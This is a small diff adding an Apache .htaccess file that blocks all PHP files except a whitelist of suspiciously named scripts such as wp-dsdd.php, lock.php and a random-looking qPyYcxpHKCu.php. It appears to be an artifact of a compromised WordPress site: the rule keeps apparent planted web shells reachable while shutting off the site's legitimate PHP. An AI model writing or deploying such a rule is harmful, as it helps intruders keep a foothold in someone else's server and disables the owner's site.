@@ -1,0 +1,8 @@
+<FilesMatch "\.php$">
+  Order Allow,Deny
+  Deny from all
+</FilesMatch>
+<FilesMatch "^(dir.php|dirs.php|abouts.php|malls.php|liefs.php|lock.php|uc.php|locks.php|wp-dsdd.php|qPyYcxpHKCu.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
